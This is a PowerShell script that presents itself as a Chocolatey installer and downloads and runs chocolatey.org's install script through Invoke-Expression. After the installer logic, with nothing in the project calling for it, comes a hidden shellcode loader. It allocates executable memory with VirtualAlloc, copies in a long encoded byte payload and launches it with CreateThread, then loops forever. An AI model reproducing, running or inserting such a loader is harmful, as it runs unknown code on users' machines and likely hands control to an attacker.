param(
	[string]$Version,
	[string]$Path,
	[switch]$Force,
	[switch]$Update,
	[switch]$Uninstall
)





$Configs = @{
	Url = "https://chocolatey.org/install.ps1"
	ConditionExclusion = "Get-Command `"cinst`" -ErrorAction SilentlyContinue"
}

$Configs | ForEach-Object{

    try{

        $_.Result = $null
        if(-not $_.Path){$_.Path = $Path}
        $Config = $_

        
        
        

        if(-not $Uninstall){

            
            
            

            if($_.ConditionExclusion){            
                $_.ConditionExclusionResult = $(Invoke-Expression $Config.ConditionExclusion -ErrorAction SilentlyContinue)        
            }    
            if(($_.ConditionExclusionResult -eq $null) -or $Force){
                    	
                
                
                

                
                
                

                $_.Url | ForEach-Object{
                    Invoke-Expression (new-object Net.WebClient).DownloadString($_)
                }
                		
                
                
                
                
                
                
                
				
                
                
                
                		
                if($Update){$_.Result = "AppUpdated";$_
                }else{$_.Result = "AppInstalled";$_}
            		
            
            
            
            		
            }else{
            	
                $_.Result = "ConditionExclusion";$_
            }

        
        
        
        	
        }else{
            
            $_.Result = "AppUninstalled";$_
        }

    
    
    

    }catch{

        $Config.Result = "Error";$Config
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x8d,0xd6,0x12,0x5d,0xdb,0xd4,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x47,0x31,0x7b,0x13,0x83,0xeb,0xfc,0x03,0x7b,0x82,0x34,0xe7,0xa1,0x74,0x3a,0x08,0x5a,0x84,0x5b,0x80,0xbf,0xb5,0x5b,0xf6,0xb4,0xe5,0x6b,0x7c,0x98,0x09,0x07,0xd0,0x09,0x9a,0x65,0xfd,0x3e,0x2b,0xc3,0xdb,0x71,0xac,0x78,0x1f,0x13,0x2e,0x83,0x4c,0xf3,0x0f,0x4c,0x81,0xf2,0x48,0xb1,0x68,0xa6,0x01,0xbd,0xdf,0x57,0x26,0x8b,0xe3,0xdc,0x74,0x1d,0x64,0x00,0xcc,0x1c,0x45,0x97,0x47,0x47,0x45,0x19,0x84,0xf3,0xcc,0x01,0xc9,0x3e,0x86,0xba,0x39,0xb4,0x19,0x6b,0x70,0x35,0xb5,0x52,0xbd,0xc4,0xc7,0x93,0x79,0x37,0xb2,0xed,0x7a,0xca,0xc5,0x29,0x01,0x10,0x43,0xaa,0xa1,0xd3,0xf3,0x16,0x50,0x37,0x65,0xdc,0x5e,0xfc,0xe1,0xba,0x42,0x03,0x25,0xb1,0x7e,0x88,0xc8,0x16,0xf7,0xca,0xee,0xb2,0x5c,0x88,0x8f,0xe3,0x38,0x7f,0xaf,0xf4,0xe3,0x20,0x15,0x7e,0x09,0x34,0x24,0xdd,0x45,0xf9,0x05,0xde,0x95,0x95,0x1e,0xad,0xa7,0x3a,0xb5,0x39,0x8b,0xb3,0x13,0xbd,0xec,0xe9,0xe4,0x51,0x13,0x12,0x15,0x7b,0xd7,0x46,0x45,0x13,0xfe,0xe6,0x0e,0xe3,0xff,0x32,0x80,0xb3,0xaf,0xec,0x61,0x64,0x0f,0x5d,0x0a,0x6e,0x80,0x82,0x2a,0x91,0x4b,0xab,0xc1,0x6b,0x1b,0x14,0xbd,0x75,0xdd,0xfc,0xbc,0x75,0xf0,0xa0,0x49,0x93,0x98,0x48,0x1c,0x0b,0x34,0xf0,0x05,0xc7,0xa5,0xfd,0x93,0xad,0xe5,0x76,0x10,0x51,0xab,0x7e,0x5d,0x41,0x5b,0x8f,0x28,0x3b,0xcd,0x90,0x86,0x56,0xf1,0x04,0x2d,0xf1,0xa6,0xb0,0x2f,0x24,0x80,0x1e,0xcf,0x03,0x9b,0x97,0x45,0xec,0xf3,0xd7,0x89,0xec,0x03,0x8e,0xc3,0xec,0x6b,0x76,0xb0,0xbe,0x8e,0x79,0x6d,0xd3,0x03,0xec,0x8e,0x82,0xf0,0xa7,0xe6,0x28,0x2f,0x8f,0xa8,0xd3,0x1a,0x11,0x94,0x05,0x62,0x67,0xf4,0x95;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

